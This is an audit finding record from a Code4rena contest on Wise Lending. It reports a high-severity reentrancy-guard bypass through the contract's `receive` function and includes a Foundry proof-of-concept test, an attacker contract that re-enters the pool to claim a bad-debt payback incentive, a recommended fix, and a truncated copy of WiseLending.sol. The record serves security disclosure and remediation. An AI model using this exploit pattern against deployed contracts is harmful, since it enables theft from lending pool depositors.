{
  "Title": "[H-01] Exploitation of the receive Function to Steal Funds",
  "Content": "\nThe `WiseLending` contract incorporates a reentrancy guard through its [syncPool](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L97) modifier, specifically within the [`_syncPoolBeforeCodeExecution`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L275) function. This guard is meant to prevent reentrancy during external calls, such as in the [`withdrawExactAmountETH`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L636) function, which processes ETH withdrawals for users.\n\nHowever, there is currently a way to reset this guard, allowing for potential reentrant attacks during external calls. The `WiseLending` contract includes a [receive](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L49) function designed to automatically redirect all ETH sent directly to it (apart from transactions from the WETH address) to a specified master address.\n\nTo forward the ETH the [`_sendValue`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/TransferHub/SendValueHelper.sol#L12) function is used, here the `sendingProgress` variable (which is used for reentrancy checks) is set to true to denote the start of the transfer process and subsequently reset to false following the completion of the call.\n\n```solidity\n    function _sendValue(\n        address _recipient,\n        uint256 _amount\n    )\n        internal\n    {\n        if (address(this).balance < _amount) {\n            revert AmountTooSmall();\n        }\n\n        sendingProgress = true;\n\n        (\n            bool success\n            ,\n        ) = payable(_recipient).call{\n            value: _amount\n        }(\"\");\n\n        sendingProgress = false;\n\n        if (success == false) {\n            revert SendValueFailed();\n        }\n    }\n```\n\nAs a result, an attacker could bypass an active reentrancy guard by initiating the receive function, effectively resetting the `sendingProgress` variable. This action clears the way for an attacker to re-enter any function within the contract, even those protected by the reentrancy guard.\n\nHaving bypassed the reentrancy protection, let's see how this vulnerability could be leveraged to steal funds from the contract.\n\nThe [`withdrawExactAmountETH`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L675) function allows users to withdraw their deposited shares from the protocol and receive ETH, this function also contains a [`healthStateCheck`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L681) to ensure post withdrawal a users position is still in a healthy state. Note that this health check is done after the external call that pays out the user ETH, this will be important later on.\n\nThe protocol also implements a [`paybackBadDebtForToken`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/FeeManager/FeeManager.sol#L730) function that allows users to pay off any other users bad debt and receive a 5% incentive for doing so.\n\nTo understand how this can be exploited, consider the following example:\n\n- User A deposits 1 ETH into the protocol.\n- User A borrows 0.5 ETH.\n- User A calls  [`withdrawExactAmountETH`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L675) to withdraw 1 ETH.\n    - User A reenters the contract through the external call.\n        - User A resets the reentrancy guard with a direct transfer of 0.001 ETH to the `WiseLending` contract.\n        - Next, User A calls the [`paybackBadDebtForToken`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/FeeManager/FeeManager.sol#L730) function to settle their own 0.5 ETH loan, which, due to the withdrawal, is now classified as bad debt. This not only clears the debt but also secures 0.5 ETH plus an additional incentive for User A.\n    - With the bad debt cleared, the [`healthStateCheck`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L681) within the withdrawal function is successfully passed.\n- Consequently, User A manages to retrieve their initial 1 ETH deposit and gain an additional 0.5 ETH (plus the incentive for paying off bad debt).\n\n### Proof Of Concept\n\nTesting is done in the `WiseLendingShutdownTest` file, with `ContractA` imported prior to executing tests:\n\n```solidity\n// import ContractA\nimport \"./ContractA.sol\";\n// import MockErc20\nimport \"./MockContracts/MockErc20.sol\";\n\ncontract WiseLendingShutdownTest is Test {\n    ...\n    ContractA public contractA;\n\n    function _deployNewWiseLending(bool _mainnetFork) internal {\n        ...\n        contractA = new ContractA(address(FEE_MANAGER_INSTANCE), payable(address(LENDING_INSTANCE)));\n        ...\n    }\n```\n\n```solidity\n    function testExploitReentrancy() public {\n        uint256 depositValue = 10 ether;\n        uint256 borrowAmount = 2 ether;\n        vm.deal(address(contractA), 2 ether);\n\n        ORACLE_HUB_INSTANCE.setHeartBeat(WETH_ADDRESS, 100 days);\n\n        POSITION_NFTS_INSTANCE.mintPosition();\n\n        uint256 nftId = POSITION_NFTS_INSTANCE.tokenOfOwnerByIndex(address(this), 0);\n\n        LENDING_INSTANCE.depositExactAmountETH{value: depositValue}(nftId);\n        LENDING_INSTANCE.borrowExactAmountETH(nftId, borrowAmount);\n\n        vm.prank(address(LENDING_INSTANCE));\n        MockErc20(WETH_ADDRESS).transfer(address(FEE_MANAGER_INSTANCE), 1 ether);\n\n        // check contractA balance\n        uint ethBalanceStart = address(contractA).balance;\n        uint wethBalanceStart = MockErc20(WETH_ADDRESS).balanceOf(address(contractA));\n        //total\n        uint totalBalanceStart = ethBalanceStart + wethBalanceStart;\n        console.log(\"totalBalanceStart\", totalBalanceStart);\n\n        // deposit using contractA\n        vm.startPrank(address(contractA));\n        LENDING_INSTANCE.depositExactAmountETHMint{value: 2 ether}();\n        vm.stopPrank();\n\n       FEE_MANAGER_INSTANCE._increaseFeeTokens(WETH_ADDRESS, 1 ether);\n        \n        // withdraw weth using contractA\n        vm.startPrank(address(contractA));\n        LENDING_INSTANCE.withdrawExactAmount(2, WETH_ADDRESS, 1 ether);\n        vm.stopPrank();\n\n        // approve feemanager for 1 weth from contractA\n        vm.startPrank(address(contractA));\n        MockErc20(WETH_ADDRESS).approve(address(FEE_MANAGER_INSTANCE), 1 ether);\n        vm.stopPrank();\n\n        // borrow using contractA\n        vm.startPrank(address(contractA));\n        LENDING_INSTANCE.borrowExactAmount(2,  WETH_ADDRESS, 0.5 ether);\n        vm.stopPrank();\n\n        // Payback amount\n        //499537556593483218\n\n        // withdraw using contractA\n        vm.startPrank(address(contractA));\n        LENDING_INSTANCE.withdrawExactAmountETH(2, 0.99 ether);\n        vm.stopPrank();\n\n        // check contractA balance\n        uint ethBalanceAfter = address(contractA).balance;\n        uint wethBalanceAfter = MockErc20(WETH_ADDRESS).balanceOf(address(contractA));\n        //total\n        uint totalBalanceAfter = ethBalanceAfter + wethBalanceAfter;\n        console.log(\"totalBalanceAfter\", totalBalanceAfter);\n        uint diff = totalBalanceAfter - totalBalanceStart;\n        assertEq(diff > 5e17, true, \"ContractA profit greater than 0.5 eth\");\n    }\n```\n\n```solidity\n// SPDX-License-Identifier: -- WISE --\n\npragma solidity =0.8.24;\n\n// import lending and fees contracts\nimport \"./WiseLending.sol\";\nimport \"./FeeManager/FeeManager.sol\";\n\ncontract ContractA {\n    address public feesContract;\n    address payable public lendingContract;\n\n    address constant WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n\n    constructor(address _feesContract, address payable _lendingContract) payable {\n        feesContract = _feesContract;\n        lendingContract = _lendingContract;\n    }\n\n    fallback() external payable {\n        if (msg.sender == lendingContract) {\n            // send lending contract 0.01 eth to reset reentrancy flag\n            (bool sent, bytes memory data) = lendingContract.call{value: 0.01 ether}(\"\");\n            //paybackBadDebtForToken\n            FeeManager(feesContract).paybackBadDebtForToken(2, WETH_ADDRESS, WETH_ADDRESS, 499537556593483218);\n        }\n    }\n}\n```\n\n### Impact\n\nThis vulnerability allows an attacker to illicitly withdraw funds from the contract through the outlined method. Additionally, the exploit could also work using the contract's liquidation process instead.\n\n### Tools Used\n\nFoundry\n\n### Recommendation\n\nEdit the `_sendValue` function to include a reentrancy check. This ensures that the reentrancy guard is first checked, preventing attackers from exploiting this function as a reentry point. This will also not disrupt transfers from the WETH address as those don’t go through the `_sendValue` function.\n\n```solidity\n    function _sendValue(\n        address _recipient,\n        uint256 _amount\n    )\n        internal\n    {\n        if (address(this).balance < _amount) {\n            revert AmountTooSmall();\n        }\n\n\t_checkReentrancy(); //add here\n\n        sendingProgress = true;\n\n        (\n            bool success\n            ,\n        ) = payable(_recipient).call{\n            value: _amount\n        }(\"\");\n\n        sendingProgress = false;\n\n        if (success == false) {\n            revert SendValueFailed();\n        }\n    }\n```\n\n**[vonMangoldt (Wise Lending) commented via duplicate issue #40](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/40#issuecomment-2009575546):**\n> Good catch but we don't consider it a high since no `userFunds` relevant state variables are changed after sending the value. And since such a call would encapsulate the `borrowrate` check at the end, everything works as planned and it cannot be used to block funds or extract value or drain funds or anything. Still good to add a reentrancy check to receive function just in case.\n>\n> UPDATE EDIT: Ok, you also submitted a stealing of funds POC we will take a look.\n\n**[vonMangoldt (Wise Lending) commented via duplicate issue #40](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/40#issuecomment-2009953330):**\n> Seems like this doesn't endanger users. A user is able to borrow beyond his allowed limit. It's basically just a flashloan without permission?\n\n**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/228#issuecomment-2082885051):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2024-02-wise-lending",
  "Code": [
    {
      "filename": "contracts/WiseLending.sol",
      "content": "// SPDX-License-Identifier: -- WISE --\n\npragma solidity =0.8.24;\n\n/**\n * @author René Hochmuth\n * @author Christoph Krpoun\n * @author Vitally Marinchenko\n */\n\nimport \"./PoolManager.sol\";\n\n/**\n * @dev WISE lending is an automated lending platform on which users can collateralize\n * their assets and borrow tokens against them.\n *\n * Users need to pay borrow rates for debt tokens, which are reflected in a borrow APY for\n * each asset type (pool). This borrow rate is variable over time and determined through the\n * utilization of the pool. The bounding curve is a family of different bonding curves adjusted\n * automatically by LASA (Lending Automated Scaling Algorithm). For more information, see:\n * [https://wisesoft.gitbook.io/wise/wise-lending-protocol/lasa-ai]\n *\n * In addition to normal deposit, withdraw, borrow, and payback functions, there are other\n * interacting modes:\n *\n * - Solely deposit and withdraw allows the user to keep their funds private, enabling\n *    them to withdraw even when the pools are borrowed empty.\n *\n * - Aave pools  allow for maximal capital efficiency by earning aave supply APY for not\n *   borrowed funds.\n *\n * - Special curve pools nside beefy farms can be used as collateral, opening up new usage\n *   possibilities for these asset types.\n *\n * - Users can pay back their borrow with lending shares of the same asset type, making it\n *   easier to manage their positions.\n *\n * - Users save their collaterals and borrows inside a position NFT, making it possible\n *   to trade their whole positions or use them in second-layer contracts\n *   (e.g., spot trading with PTP NFT trading platforms).\n */\n\ncontract WiseLending is PoolManager {\n\n    /**\n     * @dev Standard receive functions forwarding\n     * directly send ETH to the master address.\n     */\n    receive()\n        external\n        payable\n    {\n        if (msg.sender == WETH_ADDRESS) {\n            return;\n        }\n\n        _sendValue(\n            master,\n            msg.value\n        );\n    }\n\n    /**\n     * @dev Checks if position is healthy\n     * after all state changes are done.\n     */\n    modifier healthStateCheck(\n        uint256 _nftId\n    ) {\n        _;\n\n        _healthStateCheck(\n            _nftId\n        );\n    }\n\n    function _healthStateCheck(\n        uint256 _nftId\n    )\n        private\n    {\n        _checkHealthState(\n            _nftId,\n            powerFarmCheck\n        );\n\n        if (powerFarmCheck == true) {\n            powerFarmCheck = false;\n        }\n    }\n\n    /**\n     * @dev Runs the LASA algorithm known as\n     * Lending Automated Scaling Algorithm\n     * and updates pool data based on token\n     */\n    modifier syncPool(\n        address _poolToken\n    ) {\n        (\n            uint256 lendSharePrice,\n            uint256 borrowSharePrice\n        ) = _syncPoolBeforeCodeExecution(\n            _poolToken\n        );\n\n        _;\n\n        _syncPoolAfterCodeExecution(\n            _poolToken,\n            lendSharePrice,\n            borrowSharePrice\n        );\n    }\n\n    constructor(\n        address _master,\n        address _wiseOracleHubAddress,\n        address _nftContract\n    )\n        WiseLendingDeclaration(\n            _master,\n            _wiseOracleHubAddress,\n            _nftContract\n        )\n    {}\n\n    function _emitFundsSolelyWithdrawn(\n        address _caller,\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _amount\n    )\n        private\n    {\n        emit FundsSolelyWithdrawn(\n            _caller,\n            _nftId,\n            _poolToken,\n            _amount,\n            block.timestamp\n        );\n    }\n\n    function _emitFundsSolelyDeposited(\n        address _caller,\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _amount\n    )\n        private\n    {\n        emit FundsSolelyDeposited(\n            _caller,\n            _nftId,\n            _poolToken,\n            _amount,\n            block.timestamp\n        );\n    }\n\n    /**\n     * @dev Fetches share price of lending shares.\n     */\n    function _getSharePrice(\n        address _poolToken\n    )\n        private\n        view\n        returns (\n            uint256,\n            uint256\n        )\n    {\n        uint256 borrowSharePrice = borrowPoolData[_poolToken].pseudoTotalBorrowAmount\n            * PRECISION_FACTOR_E18\n            / borrowPoolData[_poolToken].totalBorrowShares;\n\n        _validateParameter(\n            MIN_BORROW_SHARE_PRICE,\n            borrowSharePrice\n        );\n\n        return (\n            lendingPoolData[_poolToken].pseudoTotalPool\n                * PRECISION_FACTOR_E18\n                / lendingPoolData[_poolToken].totalDepositShares,\n            borrowSharePrice\n        );\n    }\n\n    function _checkHealthState(\n        uint256 _nftId,\n        bool _powerFarm\n    )\n        internal\n        view\n    {\n        WISE_SECURITY.checkHealthState(\n            _nftId,\n            _powerFarm\n        );\n    }\n\n    /**\n     * @dev Compares share prices before and after\n     * execution. If borrow share price increased\n     * or lending share price decreased, revert.\n     */\n    function _compareSharePrices(\n        address _poolToken,\n        uint256 _lendSharePriceBefore,\n        uint256 _borrowSharePriceBefore\n    )\n        private\n        view\n    {\n        (\n            uint256 lendSharePriceAfter,\n            uint256 borrowSharePriceAfter\n        ) = _getSharePrice(\n            _poolToken\n        );\n\n        uint256 currentSharePriceMax = _getCurrentSharePriceMax(\n            _poolToken\n        );\n\n        _validateParameter(\n            _lendSharePriceBefore,\n            lendSharePriceAfter\n        );\n\n        _validateParameter(\n            lendSharePriceAfter,\n            currentSharePriceMax\n        );\n\n        _validateParameter(\n            _borrowSharePriceBefore,\n            currentSharePriceMax\n        );\n\n        _validateParameter(\n            borrowSharePriceAfter,\n            _borrowSharePriceBefore\n        );\n    }\n\n    /**\n    * @dev Since pool inception share price\n    * increase for both lending and borrow shares\n    * is capped at 500% apr max in between a transaction.\n    */\n    function _getCurrentSharePriceMax(\n        address _poolToken\n    )\n        private\n        view\n        returns (uint256)\n    {\n        uint256 timeDifference = block.timestamp\n            - timestampsPoolData[_poolToken].initialTimeStamp;\n\n        return timeDifference\n            * RESTRICTION_FACTOR\n            + PRECISION_FACTOR_E18;\n    }\n\n    /**\n     * @dev First part of pool sync updating pseudo\n     * amounts. Is skipped when powerFarms or aaveHub\n     * is calling the function.\n     */\n    function _syncPoolBeforeCodeExecution(\n        address _poolToken\n    )\n        private\n        returns (\n            uint256 lendSharePrice,\n            uint256 borrowSharePrice\n        )\n    {\n        _checkReentrancy();\n\n        _preparePool(\n            _poolToken\n        );\n\n        if (_aboveThreshold(_poolToken) == true) {\n            _scalingAlgorithm(\n                _poolToken\n            );\n        }\n\n        (\n            lendSharePrice,\n            borrowSharePrice\n        ) = _getSharePrice(\n            _poolToken\n        );\n    }\n\n    /**\n     * @dev Second part of pool sync updating\n     * the borrow pool rate and share price.\n     */\n    function _syncPoolAfterCodeExecution(\n        address _poolToken,\n        uint256 _lendSharePriceBefore,\n        uint256 _borrowSharePriceBefore\n    )\n        private\n    {\n        _newBorrowRate(\n            _poolToken\n        );\n\n        _compareSharePrices(\n            _poolToken,\n            _lendSharePriceBefore,\n            _borrowSharePriceBefore\n        );\n    }\n\n    /**\n     * @dev Enables _poolToken to be used as a collateral.\n     */\n    function collateralizeDeposit(\n        uint256 _nftId,\n        address _poolToken\n    )\n        external\n        syncPool(_poolToken)\n    {\n        WISE_SECURITY.checksCollateralizeDeposit(\n            _nftId,\n            msg.sender,\n            _poolToken\n        );\n\n        userLendingData[_nftId][_poolToken].unCollateralized = false;\n    }\n\n    /**\n     * @dev Disables _poolToken to be used as a collateral.\n     */\n    function unCollateralizeDeposit(\n        uint256 _nftId,\n        address _poolToken\n    )\n        external\n        syncPool(_poolToken)\n    {\n        _checkOwnerPosition(\n            _nftId,\n            msg.sender\n        );\n\n        (\n            address[] memory lendTokens,\n            address[] memory borrowTokens\n        ) = _prepareAssociatedTokens(\n            _nftId,\n            _poolToken,\n            ZERO_ADDRESS\n        );\n\n        userLendingData[_nftId][_poolToken].unCollateralized = true;\n\n        WISE_SECURITY.checkUncollateralizedDeposit(\n            _nftId,\n            _poolToken\n        );\n\n        _curveSecurityChecks(\n            lendTokens,\n            borrowTokens\n        );\n    }\n\n    // --------------- Deposit Functions -------------\n\n    /**\n     * @dev Allows to supply funds using ETH.\n     * Without converting to WETH, use ETH directly.\n     */\n    function depositExactAmountETH(\n        uint256 _nftId\n    )\n        external\n        payable\n        syncPool(WETH_ADDRESS)\n        returns (uint256)\n    {\n        return _depositExactAmountETH(\n            _nftId\n        );\n    }\n\n    function _depositExactAmountETH(\n        uint256 _nftId\n    )\n        private\n        returns (uint256)\n    {\n        uint256 shareAmount = _handleDeposit(\n            msg.sender,\n            _nftId,\n            WETH_ADDRESS,\n            msg.value\n        );\n\n        _wrapETH(\n            msg.value\n        );\n\n        return shareAmount;\n    }\n\n    /**\n     * @dev Allows to supply funds using ETH.\n     * Without converting to WETH, use ETH directly,\n     * also mints position to avoid extra transaction.\n     */\n    function depositExactAmountETHMint()\n        external\n        payable\n        syncPool(WETH_ADDRESS)\n        returns (uint256)\n    {\n        return _depositExactAmountETH(\n            _reservePosition()\n        );\n    }\n\n    /**\n     * @dev Allows to supply _poolToken and user\n     * can decide if _poolToken should be collateralized,\n     * also mints position to avoid extra transaction.\n     */\n    function depositExactAmountMint(\n        address _poolToken,\n        uint256 _amount\n    )\n        external\n        returns (uint256)\n    {\n        return depositExactAmount(\n            _reservePosition(),\n            _poolToken,\n            _amount\n        );\n    }\n\n    /**\n     * @dev Allows to supply _poolToken and user\n     * can decide if _poolToken should be collateralized.\n     */\n    function depositExactAmount(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _amount\n    )\n        public\n        syncPool(_poolToken)\n        returns (uint256)\n    {\n        uint256 shareAmount = _handleDeposit(\n            msg.sender,\n            _nftId,\n            _poolToken,\n            _amount\n        );\n\n        _safeTransferFrom(\n            _poolToken,\n            msg.sender,\n            address(this),\n            _amount\n        );\n\n        return shareAmount;\n    }\n\n    /**\n     * @dev Allows to supply funds using ETH in solely mode,\n     * which does not earn APY, but keeps the funds private.\n     * Other users are restricted from borrowing these funds,\n     * owner can always withdraw even if all funds are borrowed.\n     * Also mints position to avoid extra transaction.\n     */\n    function solelyDepositETHMint()\n        external\n        payable\n    {\n        solelyDepositETH(\n            _reservePosition()\n        );\n    }\n\n    /**\n     * @dev Allows to supply funds using ETH in solely mode,\n     * which does not earn APY, but keeps the funds private.\n     * Other users are restricted from borrowing these funds,\n     * owner can always withdraw even if all funds are borrowed.\n     */\n    function solelyDepositETH(\n        uint256 _nftId\n    )\n        public\n        payable\n        syncPool(WETH_ADDRESS)\n    {\n        _handleSolelyDeposit(\n            msg.sender,\n            _nftId,\n            WETH_ADDRESS,\n            msg.value\n        );\n\n        _wrapETH(\n            msg.value\n        );\n\n        _emitFundsSolelyDeposited(\n            msg.sender,\n            _nftId,\n            WETH_ADDRESS,\n            msg.value\n        );\n    }\n\n    /**\n     * @dev Core function combining\n     * supply logic with security\n     * checks for solely deposit.\n     */\n    function _handleSolelyDeposit(\n        address _caller,\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _amount\n    )\n        private\n    {\n        _checkDeposit(\n            _nftId,\n            _caller,\n            _poolToken,\n            _amount\n        );\n\n        _increaseMappingValue(\n            pureCollateralAmount,\n            _nftId,\n            _poolToken,\n            _amount\n        );\n\n        _increaseTotalBareToken(\n            _poolToken,\n            _amount\n        );\n\n        _addPositionTokenData(\n            _nftId,\n            _poolToken,\n            hashMapPositionLending,\n            positionLendTokenData\n        );\n    }\n\n    /**\n     * @dev Allows to supply funds using ERC20 in solely mode,\n     * which does not earn APY, but keeps the funds private.\n     * Other users are restricted from borrowing these funds,\n     * owner can always withdraw even if all funds are borrowed.\n     * Also mints position to avoid extra transaction.\n     */\n    function solelyDepositMint(\n        address _poolToken,\n        uint256 _amount\n    )\n        external\n    {\n        solelyDeposit(\n            _reservePosition(),\n            _poolToken,\n            _amount\n        );\n    }\n\n    /**\n     * @dev Allows to supply funds using ERC20 in solely mode,\n     * which does not earn APY, but keeps the funds private.\n     * Other users are restricted from borrowing these funds,\n     * owner can always withdraw even if all funds are borrowed.\n     */\n    function solelyDeposit(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _amount\n    )\n        public\n        syncPool(_poolToken)\n    {\n        _handleSolelyDeposit(\n            msg.sender,\n            _nftId,\n            _poolToken,\n            _amount\n        );\n\n        _emitFundsSolelyDeposited(\n            msg.sender,\n            _nftId,\n            _poolToken,\n            _amount\n        );\n\n        _safeTransferFrom(\n            _poolToken,\n            msg.sender,\n            address(this),\n            _amount\n        );\n    }\n\n    // --------------- Withdraw Functions -------------\n\n    /**\n     * @dev Allows to withdraw publicly\n     * deposited ETH funds using exact amount.\n     */\n    function withdrawExactAmountETH(\n        uint256 _nftId,\n        uint256 _amount\n    )\n        external\n        syncPool(WETH_ADDRESS)\n        healthStateCheck(_nftId)\n        returns (uint256)\n    {\n        uint256 withdrawShares = _handleWithdrawAmount(\n            {\n                _caller: msg.sender,\n                _nftId: _nftId,\n                _poolToken: WETH_ADDRESS,\n                _amount: _amount,\n                _onBehalf: false\n            }\n        );\n\n        _validateNonZero(\n            withdrawShares\n        );\n\n        _unwrapETH(\n            _amount\n        );\n\n        _sendValue(\n            msg.sender,\n            _amount\n        );\n\n        return withdrawShares;\n    }\n\n    /**\n     * @dev Allows to withdraw publicly\n     * deposited ETH funds using exact shares.\n     */\n    function withdrawExactSharesETH(\n        uint256 _nftId,\n        uint256 _shares\n    )\n        external\n        syncPool(WETH_ADDRESS)\n        healthStateCheck(_nftId)\n        returns (uint256)\n    {\n        uint256 withdrawAmount = _handleWithdrawShares(\n            {\n                _caller: msg.sender,\n                _nftId: _nftId,\n                _poolToken: WETH_ADDRESS,\n                _shares: _shares,\n                _onBehalf: false\n            }\n        );\n\n        _validateNonZero(\n            withdrawAmount\n        );\n\n        _unwrapETH(\n            withdrawAmount\n        );\n\n        _sendValue(\n            msg.sender,\n            withdrawAmount\n        );\n\n        return withdrawAmount;\n    }\n\n    /**\n     * @dev Allows to withdraw publicly\n     * deposited ERC20 funds using exact amount.\n     */\n    function withdrawExactAmount(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _withdrawAmount\n    )\n        external\n        syncPool(_poolToken)\n        healthStateCheck(_nftId)\n        returns (uint256)\n    {\n        uint256 withdrawShares = _handleWithdrawAmount(\n            {\n                _caller: msg.sender,\n                _nftId: _nftId,\n                _poolToken: _poolToken,\n                _amount: _withdrawAmount,\n                _onBehalf: false\n            }\n        );\n\n        _validateNonZero(\n            withdrawShares\n        );\n\n        _safeTransfer(\n            _poolToken,\n            msg.sender,\n            _withdrawAmount\n        );\n\n        return withdrawShares;\n    }\n\n    /**\n     * @dev Allows to withdraw privately\n     * deposited ETH funds using input amount.\n     */\n    function solelyWithdrawETH(\n        uint256 _nftId,\n        uint256 _withdrawAmount\n    )\n        external\n        syncPool(WETH_ADDRESS)\n        healthStateCheck(_nftId)\n    {\n        _handleSolelyWithdraw(\n            msg.sender,\n            _nftId,\n            WETH_ADDRESS,\n            _withdrawAmount\n        );\n\n        _unwrapETH(\n            _withdrawAmount\n        );\n\n        _sendValue(\n            msg.sender,\n            _withdrawAmount\n        );\n    }\n\n    /**\n     * @dev Allows to withdraw privately\n     * deposited ERC20 funds using input amount.\n     */\n    function solelyWithdraw(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _withdrawAmount\n    )\n        external\n        syncPool(_poolToken)\n        healthStateCheck(_nftId)\n    {\n        _handleSolelyWithdraw(\n            msg.sender,\n            _nftId,\n            _poolToken,\n            _withdrawAmount\n        );\n\n        _safeTransfer(\n            _poolToken,\n            msg.sender,\n            _withdrawAmount\n        );\n    }\n\n    /**\n     * @dev Core function combining\n     * withdraw logic for solely\n     * withdraw with security checks.\n     */\n    function _coreSolelyWithdraw(\n        address _caller,\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _amount\n    )\n        private\n    {\n        (\n            address[] memory lendTokens,\n            address[] memory borrowTokens\n        ) = _prepareAssociatedTokens(\n            _nftId,\n            _poolToken,\n            ZERO_ADDRESS\n        );\n\n        powerFarmCheck = WISE_SECURITY.checksSolelyWithdraw(\n            _nftId,\n            _caller,\n            _poolToken\n        );\n\n        _decreasePositionMappingValue(\n            pureCollateralAmount,\n            _nftId,\n            _poolToken,\n            _amount\n        );\n\n        _decreaseTotalBareToken(\n            _poolToken,\n            _amount\n        );\n\n        _removeEmptyLendingData(\n            _nftId,\n            _poolToken\n        );\n\n        _curveSecurityChecks(\n            lendTokens,\n            borrowTokens\n        );\n    }\n\n    /**\n     * @dev Allows to withdraw privately\n     * deposited ERC20 on behalf of owner.\n     * Requires approval by _nftId owner.\n     */\n    function withdrawOnBehalfExactAmount(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _withdrawAmount\n    )\n        external\n        onlyAaveHub\n        syncPool(_poolToken)\n        healthStateCheck(_nftId)\n        returns (uint256)\n    {\n        uint256 withdrawShares = calculateLendingShares(\n            {\n                _poolToken: _poolToken,\n                _amount: _withdrawAmount,\n                _maxSharePrice: true\n            }\n        );\n\n        _coreWithdrawToken(\n            {\n                _caller: msg.sender,\n                _nftId: _nftId,\n                _poolToken: _poolToken,\n                _amount: _withdrawAmount,\n                _shares: withdrawShares,\n                _onBehalf: true\n            }\n        );\n\n        _safeTransfer(\n            _poolToken,\n            msg.sender,\n            _withdrawAmount\n        );\n\n        return withdrawShares;\n    }\n\n    /**\n     * @dev Allows to withdraw ERC20\n     * funds using shares as input value\n     */\n    function withdrawExactShares(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _shares\n    )\n        external\n        syncPool(_poolToken)\n        healthStateCheck(_nftId)\n        returns (uint256)\n    {\n        uint256 withdrawAmount = _handleWithdrawShares(\n            {\n                _caller: msg.sender,\n                _nftId: _nftId,\n                _poolToken: _poolToken,\n                _shares: _shares,\n                _onBehalf: false\n            }\n        );\n\n        _validateNonZero(\n            withdrawAmount\n        );\n\n        _safeTransfer(\n            _poolToken,\n            msg.sender,\n            withdrawAmount\n        );\n\n        return withdrawAmount;\n    }\n\n    /**\n     * @dev Withdraws ERC20 funds on behalf\n     * of _nftId owner, requires approval.\n     */\n    function withdrawOnBehalfExactShares(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _shares\n    )\n        external\n        onlyAaveHub\n        syncPool(_poolToken)\n        healthStateCheck(_nftId)\n        returns (uint256)\n    {\n        uint256 withdrawAmount = _handleWithdrawShares(\n            {\n                _caller: msg.sender,\n                _nftId: _nftId,\n                _poolToken: _poolToken,\n                _shares: _shares,\n                _onBehalf: true\n            }\n        );\n\n        _safeTransfer(\n            _poolToken,\n            msg.sender,\n            withdrawAmount\n        );\n\n        return withdrawAmount;\n    }\n\n    // --------------- Borrow Functions -------------\n\n    /**\n     * @dev Allows to borrow ETH funds\n     * Requires user to have collateral.\n     */\n    function borrowExactAmountETH(\n        uint256 _nftId,\n        uint256 _amount\n    )\n        external\n        syncPool(WETH_ADDRESS)\n        healthStateCheck(_nftId)\n        returns (uint256)\n    {\n        _checkOwnerPosition(\n            _nftId,\n            msg.sender\n        );\n\n        uint256 shares = _handleBorrowExactAmount({\n            _nftId: _nftId,\n            _poolToken: WETH_ADDRESS,\n            _amount: _amount,\n            _onBehalf: false\n        });\n\n        _validateNonZero(\n            shares\n        );\n\n        _unwrapETH(\n            _amount\n        );\n\n        _sendValue(\n            msg.sender,\n            _amount\n        );\n\n        return shares;\n    }\n\n    /**\n     * @dev Allows to borrow ERC20 funds\n     * Requires user to have collateral.\n     */\n    function borrowExactAmount(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _amount\n    )\n        external\n        syncPool(_poolToken)\n        healthStateCheck(_nftId)\n        returns (uint256)\n    {\n        _checkOwnerPosition(\n            _nftId,\n            msg.sender\n        );\n\n        uint256 shares = _handleBorrowExactAmount({\n            _nftId: _nftId,\n            _poolToken: _poolToken,\n            _amount: _amount,\n            _onBehalf: false\n        });\n\n        _validateNonZero(\n            shares\n        );\n\n        _safeTransfer(\n            _poolToken,\n            msg.sender,\n            _amount\n        );\n\n        return shares;\n    }\n\n    /**\n     * @dev Allows to borrow ERC20 funds\n     * on behalf of _nftId owner, if approved.\n     */\n    function borrowOnBehalfExactAmount(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _amount\n    )\n        external\n        onlyAaveHub\n        syncPool(_poolToken)\n        healthStateCheck(_nftId)\n        returns (uint256)\n    {\n        uint256 shares = _handleBorrowExactAmount({\n            _nftId: _nftId,\n            _poolToken: _poolToken,\n            _amount: _amount,\n            _onBehalf: true\n        });\n\n        _safeTransfer(\n            _poolToken,\n            msg.sender,\n            _amount\n        );\n\n        return shares;\n    }\n\n    // --------------- Payback Functions ------------\n\n    /**\n     * @dev Ability to payback ETH loans\n     * by providing exact payback amount.\n     */\n    function 